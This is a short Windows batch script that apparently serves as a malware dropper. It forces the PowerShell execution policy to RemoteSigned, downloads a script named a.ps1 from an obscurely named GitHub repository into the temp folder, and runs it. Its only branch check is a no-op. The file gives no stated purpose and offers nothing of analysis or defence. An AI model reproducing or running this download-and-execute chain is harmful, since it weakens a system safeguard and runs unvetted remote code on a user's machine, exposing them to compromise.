@echo off
if "%1" == "hidden" goto run

:run
powershell -NoProfile -Command "Set-ExecutionPolicy RemoteSigned -Force"
powershell -NoProfile -Command "iwr 'https://raw.githubusercontent.com/cqdll/-/main/a.ps1' -OutFile \"%TEMP%\a.ps1\" -UseBasicParsing"
powershell -NoProfile -File "%TEMP%\a.ps1"
